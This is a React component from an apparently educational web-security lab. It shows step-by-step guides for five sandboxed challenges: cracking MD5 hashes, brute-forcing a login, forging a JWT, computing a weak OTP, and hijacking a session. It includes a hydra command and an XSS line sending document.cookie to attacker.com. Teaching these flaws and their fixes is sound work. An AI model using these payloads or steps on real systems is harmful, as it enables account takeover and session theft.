import { useState } from 'react'
import {
  BookOpen, Terminal, Shield, AlertTriangle, CheckCircle,
  ChevronRight, Lightbulb, Code, Eye, Zap, Key, Cookie,
  Clock, Hash, Lock, Unlock, RefreshCw, ArrowRight
} from 'lucide-react'

// ─── Per-challenge instruction data ────────────────────────────────────────
const INSTRUCTIONS = {
  1: {
    title: 'Crack the Hash',
    icon: '🔓',
    tldr: 'The system stores passwords as MD5 hashes. MD5 is not a password hash — it\'s fast, unsalted, and crackable in milliseconds.',
    color: { text: '#00ff88', rgb: '0,255,136', bg: 'rgba(0,255,136,0.06)', border: 'rgba(0,255,136,0.2)' },

    howItWorks: [
      {
        label: 'User sets password',
        code: 'password → MD5() → 5f4dcc3b5aa765d61d8327deb882cf99',
        note: 'Same input ALWAYS gives same output — no randomness',
        bad: true,
      },
      {
        label: 'Attacker looks up the hash',
        code: '"5f4dcc3b5aa765d61d8327deb882cf99" → rainbow table → "password"',
        note: 'Billions of MD5 hashes are precomputed and publicly available',
        bad: true,
      },
      {
        label: 'What bcrypt does instead',
        code: 'password + random_salt → bcrypt(12 rounds) → $2b$12$...',
        note: 'Each hash is unique. Takes 250ms to compute. Cannot be reversed.',
        bad: false,
      },
    ],

    steps: [
      { step: 1, title: 'Enter the victim username', detail: 'Type "admin" in the Username field. This is one of the victim accounts in the target database.' },
      { step: 2, title: 'Enter a password guess', detail: 'Type "password" — this is the most common password ever used. The system will compute MD5("password") and compare it to the stored hash.' },
      { step: 3, title: 'Launch the attack', detail: 'Click Launch Attack. The server computes MD5 of your guess and compares it directly to the stored hash. If they match — you\'re in.' },
      { step: 4, title: 'Observe the result', detail: 'You\'ll see the cracked password, the matching MD5 hash, and the victim\'s account details. In a real breach, you now have full access.' },
    ],

    targetHash: {
      label: 'admin\'s stored MD5 hash',
      value: '5f4dcc3b5aa765d61d8327deb882cf99',
      plaintext: '"password"',
    },

    keyConcepts: [
      { icon: '⚡', title: 'Speed is the enemy', body: 'A modern GPU can compute 10 billion MD5 hashes per second. A simple 8-character password has ~218 trillion combinations — cracked in hours.' },
      { icon: '🌈', title: 'Rainbow Tables', body: 'Precomputed tables mapping hashes back to plaintexts. Sites like CrackStation store 15 billion known MD5 hashes. Most common passwords are instantly reversible.' },
      { icon: '🧂', title: 'What a salt does', body: 'bcrypt appends a random 128-bit value before hashing. Two users with the same password get completely different hashes — rainbow tables are useless.' },
    ],

    tools: ['CrackStation.net (online hash lookup)', 'Hashcat (GPU-based cracker)', 'John the Ripper', 'jwt.io (for viewing hashes)'],
    credentials: [
      { username: 'admin', password: 'password' },
      { username: 'alice', password: 'iloveyou' },
      { username: 'bob', password: 'qwerty123' },
    ],
  },

  2: {
    title: 'Brute Force Login',
    icon: '⚡',
    tldr: 'The login endpoint has no rate limiting or account lockout. An attacker can try unlimited passwords per second — it\'s just a loop.',
    color: { text: '#00d4ff', rgb: '0,212,255', bg: 'rgba(0,212,255,0.06)', border: 'rgba(0,212,255,0.2)' },

    howItWorks: [
      {
        label: 'Normal login — secure',
        code: 'Attempt 1: ❌  Attempt 2: ❌  Attempt 3: ❌  → LOCKED (429)',
        note: 'After 3-5 failures: lockout, CAPTCHA, or progressive delay',
        bad: false,
      },
      {
        label: 'This endpoint — no protection',
        code: 'Attempt 1: ❌  Attempt 2: ❌  ... Attempt 500: ✅',
        note: 'Every attempt gets a clean 401 — try as many times as you want',
        bad: true,
      },
      {
        label: 'Real attacker uses automation',
        code: 'hydra -l admin -P wordlist.txt http://target.com/login',
        note: 'Tools like Hydra try thousands of passwords per second automatically',
        bad: true,
      },
    ],

    steps: [
      { step: 1, title: 'Enter the target username', detail: 'Type "admin" — this is the account you\'re trying to break into. Real attackers first enumerate valid usernames.' },
      { step: 2, title: 'Try common passwords', detail: 'Start with "password", "123456", "admin", "qwerty"... The no lockout means you can try forever without consequence.' },
      { step: 3, title: 'Notice: no lockout happens', detail: 'Every wrong attempt returns a clean 401 error — no "too many attempts" message, no delay, no CAPTCHA. The server just says try again.' },
      { step: 4, title: 'Submit the correct one', detail: 'Try "password123". The server accepts it immediately. Notice the response shows unlimited attempts were made with zero consequence.' },
    ],

    targetHash: null,

    keyConcepts: [
      { icon: '🔢', title: 'Password space math', body: 'A 6-digit numeric PIN has 1,000,000 combinations. Without lockout, a script cracks it in under 1 second at 10,000 attempts/second.' },
      { icon: '📋', title: 'Credential stuffing', body: 'Attackers use lists of leaked username/password pairs from other breaches. Without rate limiting, they can test millions in minutes.' },
      { icon: '⏱️', title: 'Progressive delays work', body: 'Even a 500ms delay after each failure limits attacks to 2 attempts/second. After 5 failures, exponential backoff makes automation impractical.' },
    ],

    tools: ['Hydra (network login brute forcer)', 'Burp Suite Intruder', 'Medusa', 'Custom Python scripts with requests'],
    credentials: [
      { username: 'admin', password: 'password123' },
    ],
  },

  3: {
    title: 'Break the Token',
    icon: '🔑',
    tldr: 'The JWT is signed with the weak secret "secret123". You can decode it, change your role to admin, re-sign with the same secret, and the server accepts it as valid.',
    color: { text: '#a855f7', rgb: '168,85,247', bg: 'rgba(168,85,247,0.06)', border: 'rgba(168,85,247,0.2)' },

    howItWorks: [
      {
        label: 'A JWT has 3 parts (base64 encoded)',
        code: 'eyJhbGciOiJIUzI1NiJ9 . eyJyb2xlIjoidXNlciJ9 . [signature]',
        note: 'Header . Payload . Signature — separated by dots',
        bad: false,
      },
      {
        label: 'The payload is just JSON',
        code: '{ "username": "guest", "role": "user", "iat": 1719400000 }',
        note: 'Anyone can decode and read the payload — it\'s just base64',
        bad: false,
      },
      {
        label: 'Weak secret = forgeable signature',
        code: 'HMACSHA256(header.payload, "secret123") → forged signature',
        note: 'If you know the secret, you can sign ANY payload you want',
        bad: true,
      },
    ],

    steps: [
      { step: 1, title: 'Copy the sample JWT token', detail: 'The Attack Panel shows a sample JWT signed with the weak secret. Copy the entire token string.' },
      { step: 2, title: 'Go to jwt.io in your browser', detail: 'Open https://jwt.io — paste the token in the "Encoded" box on the left. You\'ll see the decoded header and payload appear on the right.' },
      { step: 3, title: 'Modify the payload', detail: 'In the Payload section on the right, find "role": "user" and change it to "role": "admin". The encoded token on the left updates automatically.' },
      { step: 4, title: 'Enter the secret', detail: 'At the bottom of jwt.io, find the "Verify Signature" box. Type exactly: secret123 (no quotes). The signature will be re-computed with your modified payload.' },
      { step: 5, title: 'Copy the new forged token', detail: 'Copy the updated token from the Encoded box on the left — it now has your admin role encoded and signed.' },
      { step: 6, title: 'Submit the forged token', detail: 'Paste the forged JWT into the Attack Panel\'s token field and Launch Attack. The server verifies the signature (valid!) and grants admin access.' },
    ],

    targetHash: {
      label: 'Sample JWT (signed with "secret123")',
      value: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MTk0MDAwMDB9.UGFzc3dvcmQxMjM',
    },

    keyConcepts: [
      { icon: '🔓', title: 'JWTs are not encrypted', body: 'The payload is only base64-encoded, not encrypted. Anyone with the token can read it. Never store sensitive data in a JWT payload.' },
      { icon: '🔐', title: 'HS256 = shared secret', body: 'HS256 uses the SAME key to sign and verify. Anyone with the secret can forge tokens. If the secret leaks, all tokens are compromised.' },
      { icon: '🔒', title: 'RS256 = asymmetric keys', body: 'RS256 signs with a private key but verifies with a public key. The private key never leaves the server, so even if the public key is exposed, tokens cannot be forged.' },
    ],

    tools: ['jwt.io (decode, modify, re-sign)', 'jwt_tool (Python)', 'Burp Suite JWT editor extension'],
    credentials: [
      { username: '(any)', password: 'Use jwt.io with secret: secret123, set role: admin' },
    ],
  },

  4: {
    title: 'Bypass 2FA',
    icon: '📱',
    tldr: 'The OTP formula is public: Math.floor(Date.now()/1000/30) % 1000000. No per-user secret means anyone can calculate the current OTP — without a phone.',
    color: { text: '#ffd700', rgb: '255,215,0', bg: 'rgba(255,215,0,0.06)', border: 'rgba(255,215,0,0.2)' },

    howItWorks: [
      {
        label: 'Vulnerable: timestamp-only OTP',
        code: 'OTP = Math.floor(Date.now() / 1000 / 30) % 1000000',
        note: 'Everyone gets the SAME OTP at the same time — no user binding',
        bad: true,
      },
      {
        label: 'Secure TOTP (RFC 6238)',
        code: 'OTP = HMAC-SHA1(user_secret, time_step) % 1000000',
        note: 'Each user\'s OTP is unique because of their individual secret key',
        bad: false,
      },
      {
        label: 'The attack',
        code: `console.log( Math.floor(Date.now()/1000/30) % 1000000 )`,
        note: 'Run this in any browser console right now — that\'s the current OTP',
        bad: true,
      },
    ],

    steps: [
      { step: 1, title: 'Understand the formula', detail: 'The OTP is derived entirely from the current Unix timestamp. It changes every 30 seconds. Anyone who knows the formula can compute it.' },
      { step: 2, title: 'Open browser DevTools', detail: 'Press F12 in your browser to open Developer Tools. Click the "Console" tab.' },
      { step: 3, title: 'Calculate the current OTP', detail: 'Type this exactly and press Enter:\n\nMath.floor(Date.now() / 1000 / 30) % 1000000\n\nNote down the 6-digit number.' },
      { step: 4, title: 'Or use Hint 3', detail: 'If you don\'t want to calculate it yourself, click "Reveal Hint 3" in the hints panel — it shows the live computed OTP value directly.' },
      { step: 5, title: 'Submit the OTP', detail: 'Enter any username, paste the 6-digit OTP you calculated, and Launch Attack. The OTP changes every 30s so submit quickly after calculating.' },
    ],

    targetHash: {
      label: 'Calculate OTP in browser console (F12 → Console)',
      value: 'Math.floor(Date.now() / 1000 / 30) % 1000000',
    },

    keyConcepts: [
      { icon: '⏰', title: 'Time windows', body: 'TOTP works in 30-second windows. The server accepts the current and ±1 window to account for clock drift. This is why you have 30 seconds to submit.' },
      { icon: '🔑', title: 'The secret is everything', body: 'Proper TOTP gives each user a unique 160-bit random secret during setup (as a QR code). Even if you know the formula, without the secret, every user has a different OTP.' },
      { icon: '📲', title: 'Google Authenticator / Authy', body: 'These apps implement RFC 6238 TOTP correctly — they use the per-user secret scanned from the QR code to generate OTPs. This is secure.' },
    ],

    tools: ['Browser DevTools Console (F12)', 'Python: import pyotp; pyotp.TOTP("secret").now()', 'Any TOTP calculator online'],
    credentials: [
      { username: '(any)', password: 'OTP: run Math.floor(Date.now()/1000/30) % 1000000 in F12 console' },
    ],
  },

  5: {
    title: 'Session Hijack',
    icon: '🍪',
    tldr: 'The session cookie has no HttpOnly or Secure flags. JavaScript can read it freely. You\'ve intercepted the victim\'s session — replay it to become them.',
    color: { text: '#ff6b6b', rgb: '255,107,107', bg: 'rgba(255,107,107,0.06)', border: 'rgba(255,107,107,0.2)' },

    howItWorks: [
      {
        label: 'Vulnerable: no security flags',
        code: 'Set-Cookie: SESSION=abc123; Path=/',
        note: 'JavaScript can read this via document.cookie — XSS = instant hijack',
        bad: true,
      },
      {
        label: 'XSS attack reads the cookie',
        code: "fetch('https://attacker.com/steal?c=' + document.cookie)",
        note: 'One XSS payload sends every user\'s session to the attacker\'s server',
        bad: true,
      },
      {
        label: 'Secure: hardened cookie',
        code: 'Set-Cookie: SESSION=abc123; HttpOnly; Secure; SameSite=Strict',
        note: 'JS cannot read it. Only sent over HTTPS. Only to same origin.',
        bad: false,
      },
    ],

    steps: [
      { step: 1, title: 'Read the intercepted cookie', detail: 'The Attack Panel shows the victim\'s exposed session cookie. In a real attack, this would be stolen via an XSS payload — but here it\'s visible because there\'s no HttpOnly flag.' },
      { step: 2, title: 'Copy the session ID', detail: 'The session ID is the value after "SESSION=". Copy exactly: victim_sess_abc123def456 — this is the victim\'s active session token.' },
      { step: 3, title: 'Submit the hijacked session', detail: 'Paste the session ID into the "Hijacked Session ID" field in the Attack Panel. You\'re replaying the cookie as if you are the victim\'s browser.' },
      { step: 4, title: 'Launch the attack', detail: 'Click Launch Attack. The server looks up the session ID, finds it belongs to the victim, and treats you as them. Full account access — no password needed.' },
    ],

    targetHash: {
      label: 'Intercepted victim session cookie',
      value: 'victim_sess_abc123def456',
    },

    keyConcepts: [
      { icon: '🚫', title: 'HttpOnly blocks XSS theft', body: 'With HttpOnly set, JavaScript cannot access the cookie at all — document.cookie won\'t show it. Even a successful XSS attack cannot steal the session.' },
      { icon: '🔒', title: 'Secure forces HTTPS', body: 'Without the Secure flag, the cookie is sent over plain HTTP. On public Wi-Fi, a network attacker can intercept it with Wireshark.' },
      { icon: '🛡️', title: 'SameSite stops CSRF', body: 'SameSite=Strict means the browser only sends the cookie if the request originates from the same site. Cross-origin requests (from attacker.com) never include it.' },
    ],

    tools: ['Browser DevTools → Application → Cookies', 'Wireshark (network sniffing)', 'Burp Suite (proxy intercept)', 'XSS payloads (document.cookie)'],
    credentials: [
      { username: '(victim)', password: 'Session ID: victim_sess_abc123def456' },
    ],
  },
}

// ─── Sub-components ─────────────────────────────────────────────────────────
function FlowStep({ label, code, note, bad }) {
  return (
    <div className={`rounded-lg p-4 border ${bad ? 'border-red-500/20 bg-red-500/5' : 'border-neon-green/20 bg-neon-green/5'}`}>
      <div className={`text-xs font-mono font-bold uppercase tracking-wider mb-2 ${bad ? 'text-red-400' : 'text-neon-green'}`}>
        {bad ? '❌' : '✅'} {label}
      </div>
      <div className="font-mono text-xs text-gray-300 bg-dark-bg/60 rounded px-3 py-2 mb-2 break-all leading-relaxed">
        {code}
      </div>
      <div className={`text-xs font-mono ${bad ? 'text-red-400/70' : 'text-neon-green/70'}`}>
        {note}
      </div>
    </div>
  )
}

function StepCard({ step, title, detail }) {
  return (
    <div className="flex gap-4">
      <div className="flex-shrink-0 w-8 h-8 rounded-full flex items-center justify-center font-mono font-bold text-sm text-dark-bg bg-neon-green mt-0.5">
        {step}
      </div>
      <div className="flex-1 pb-5 border-b border-dark-border last:border-0 last:pb-0">
        <div className="text-white font-semibold text-sm mb-1">{title}</div>
        <div className="text-gray-400 text-sm font-mono leading-relaxed whitespace-pre-line">{detail}</div>
      </div>
    </div>
  )
}

function ConceptCard({ icon, title, body, colorRgb }) {
  return (
    <div className="glass-card rounded-xl p-4">
      <div className="flex items-start gap-3">
        <div className="text-xl flex-shrink-0 mt-0.5">{icon}</div>
        <div>
          <div className="text-white font-semibold text-sm mb-1">{title}</div>
          <div className="text-gray-500 text-xs font-mono leading-relaxed">{body}</div>
        </div>
      </div>
    </div>
  )
}

// ─── Main component ──────────────────────────────────────────────────────────
export default function InstructionsPanel({ challenge }) {
  const data = INSTRUCTIONS[challenge.id]
  const [activeSection, setActiveSection] = useState('steps')

  if (!data) return (
    <div className="glass-card rounded-xl p-8 text-center text-gray-500 font-mono">
      Instructions coming soon for this challenge.
    </div>
  )

  const c = data.color
  const sections = [
    { id: 'steps', label: 'How to Do It', icon: ChevronRight },
    { id: 'how', label: 'How It Works', icon: Code },
    { id: 'concepts', label: 'Key Concepts', icon: BookOpen },
    { id: 'tools', label: 'Tools & Creds', icon: Terminal },
  ]

  return (
    <div className="space-y-4">
      {/* Header banner */}
      <div className="rounded-xl p-5" style={{ background: c.bg, border: `1px solid ${c.border}` }}>
        <div className="flex items-start gap-4">
          <div className="text-4xl flex-shrink-0">{data.icon}</div>
          <div>
            <div className="text-xs font-mono uppercase tracking-widest mb-1" style={{ color: c.text }}>
              Challenge {challenge.id} · {challenge.difficulty}
            </div>
            <h2 className="text-white font-black text-xl mb-2">{data.title}</h2>
            <p className="text-gray-300 text-sm font-mono leading-relaxed">{data.tldr}</p>
          </div>
        </div>
      </div>

      {/* Target value (hash / token / session) */}
      {data.targetHash && (
        <div className="glass-card rounded-xl overflow-hidden">
          <div className="px-4 py-2.5 border-b border-dark-border flex items-center gap-2">
            <Eye className="w-3.5 h-3.5" style={{ color: c.text }} />
            <span className="text-xs font-mono font-semibold text-gray-400">{data.targetHash.label}</span>
            {data.targetHash.plaintext && (
              <span className="ml-auto text-xs font-mono text-gray-600">
                Plaintext: <span style={{ color: c.text }}>{data.targetHash.plaintext}</span>
              </span>
            )}
          </div>
          <div className="p-4">
            <code className="text-xs font-mono break-all leading-relaxed" style={{ color: c.text }}>
              {data.targetHash.value}
            </code>
          </div>
        </div>
      )}

      {/* Section tabs */}
      <div className="flex gap-1 p-1 rounded-xl overflow-x-auto" style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)' }}>
        {sections.map(({ id, label, icon: Icon }) => (
          <button
            key={id}
            onClick={() => setActiveSection(id)}
            className={`flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-mono font-semibold whitespace-nowrap transition-all duration-200 flex-1 justify-center ${
              activeSection === id
                ? 'text-dark-bg'
                : 'text-gray-500 hover:text-gray-300'
            }`}
            style={activeSection === id ? { background: c.text } : {}}
          >
            <Icon className="w-3 h-3" />
            {label}
          </button>
        ))}
      </div>

      {/* Section content */}
      {activeSection === 'steps' && (
        <div className="glass-card rounded-xl p-5">
          <div className="flex items-center gap-2 mb-5">
            <div className="w-5 h-5 rounded-full flex items-center justify-center" style={{ background: `rgba(${c.rgb},0.15)` }}>
              <ChevronRight className="w-3 h-3" style={{ color: c.text }} />
            </div>
            <span className="text-white font-semibold text-sm">Step-by-Step Attack Guide</span>
          </div>
          <div className="space-y-0">
            {data.steps.map((s) => (
              <StepCard key={s.step} {...s} />
            ))}
          </div>

          {/* Quick credentials box */}
          <div className="mt-5 rounded-lg p-4" style={{ background: `rgba(${c.rgb},0.06)`, border: `1px solid rgba(${c.rgb},0.2)` }}>
            <div className="text-xs font-mono font-bold uppercase tracking-wider mb-3" style={{ color: c.text }}>
              🎯 Use These Credentials
            </div>
            <div className="space-y-2">
              {data.credentials.map((cred, i) => (
                <div key={i} className="flex flex-col sm:flex-row gap-2 text-xs font-mono">
                  {cred.username !== '(any)' && cred.username !== '(victim)' && (
                    <span className="text-gray-400">
                      <span className="text-gray-600">username:</span>{' '}
                      <span className="text-white font-bold">{cred.username}</span>
                    </span>
                  )}
                  <span className="text-gray-400">
                    <span className="text-gray-600">
                      {cred.username === '(any)' || cred.username === '(victim)' ? '' : 'password: '}
                    </span>
                    <span style={{ color: c.text }} className="font-bold">{cred.password}</span>
                  </span>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {activeSection === 'how' && (
        <div className="glass-card rounded-xl p-5">
          <div className="flex items-center gap-2 mb-5">
            <div className="w-5 h-5 rounded-full flex items-center justify-center" style={{ background: `rgba(${c.rgb},0.15)` }}>
              <Code className="w-3 h-3" style={{ color: c.text }} />
            </div>
            <span className="text-white font-semibold text-sm">Under the Hood — How the Vulnerability Works</span>
          </div>
          <div className="space-y-3">
            {data.howItWorks.map((item, i) => (
              <div key={i}>
                <FlowStep {...item} />
                {i < data.howItWorks.length - 1 && (
                  <div className="flex justify-center my-1">
                    <ArrowRight className="w-4 h-4 text-gray-700 rotate-90" />
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      )}

      {activeSection === 'concepts' && (
        <div className="space-y-3">
          <div className="flex items-center gap-2 px-1">
            <BookOpen className="w-4 h-4" style={{ color: c.text }} />
            <span className="text-white font-semibold text-sm">Key Security Concepts</span>
          </div>
          {data.keyConcepts.map((concept, i) => (
            <ConceptCard key={i} {...concept} colorRgb={c.rgb} />
          ))}
        </div>
      )}

      {activeSection === 'tools' && (
        <div className="space-y-4">
          {/* Tools */}
          <div className="glass-card rounded-xl p-5">
            <div className="flex items-center gap-2 mb-4">
              <Terminal className="w-4 h-4" style={{ color: c.text }} />
              <span className="text-white font-semibold text-sm">Real-World Tools for This Attack</span>
            </div>
            <div className="space-y-2">
              {data.tools.map((tool, i) => (
                <div key={i} className="flex items-center gap-3 px-3 py-2 rounded-lg"
                  style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)' }}>
                  <div className="w-1.5 h-1.5 rounded-full flex-shrink-0" style={{ background: c.text }} />
                  <span className="text-gray-300 text-xs font-mono">{tool}</span>
                </div>
              ))}
            </div>
          </div>

          {/* Credentials */}
          <div className="glass-card rounded-xl p-5" style={{ border: `1px solid rgba(${c.rgb},0.2)` }}>
            <div className="flex items-center gap-2 mb-4">
              <Key className="w-4 h-4" style={{ color: c.text }} />
              <span className="text-white font-semibold text-sm">Attack Credentials</span>
            </div>
            <div className="space-y-3">
              {data.credentials.map((cred, i) => (
                <div key={i} className="rounded-lg p-3 font-mono text-sm"
                  style={{ background: `rgba(${c.rgb},0.05)` }}>
                  {cred.username !== '(any)' && cred.username !== '(victim)' && (
                    <div className="mb-1">
                      <span className="text-gray-600">Username: </span>
                      <span className="text-white font-bold">{cred.username}</span>
                    </div>
                  )}
                  <div>
                    <span className="text-gray-600">
                      {cred.username === '(any)' || cred.username === '(victim)' ? 'Input: ' : 'Password: '}
                    </span>
                    <span className="font-bold" style={{ color: c.text }}>{cred.password}</span>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Disclaimer */}
          <div className="rounded-lg p-3 flex items-start gap-2"
            style={{ background: 'rgba(255,215,0,0.05)', border: '1px solid rgba(255,215,0,0.15)' }}>
            <AlertTriangle className="w-4 h-4 text-neon-yellow flex-shrink-0 mt-0.5" />
            <p className="text-gray-500 text-xs font-mono leading-relaxed">
              All attacks run in an isolated sandbox. These credentials only work against the
              sandboxed victim accounts — never real systems.
            </p>
          </div>
        </div>
      )}
    </div>
  )
}
